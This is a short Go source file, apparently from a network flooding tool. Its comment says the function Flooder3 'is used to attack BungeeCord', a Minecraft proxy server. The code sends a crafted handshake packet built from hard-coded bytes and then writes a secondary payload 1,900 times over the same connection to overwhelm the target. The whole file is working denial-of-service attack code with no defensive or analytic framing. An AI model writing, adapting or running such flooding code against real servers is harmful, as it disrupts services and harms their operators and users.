package methods

import (
	"fmt"
	"net"
)

// Flooder3 is used to attack BungeeCord
func Flooder3(data *Data, out net.Conn) bool {
	if data.bytes == nil {
		data.supplyBytes(makeBytes(0, 47, 20, 109, data.Host, 99, 45, 50, 50, 55, 55, 46, 114, 97, 122, 105, 120, 112, 118, 112, 46, 100, 101, 46, 99, -35, 2))
	}

	_, err := out.Write(data.bytes)

	if err != nil {
		return true
	}

	fmt.Println("sent")

	for n := 0; n < 1900; n++ {
		out.Write(data.minorBytes)
	}

	return false
}
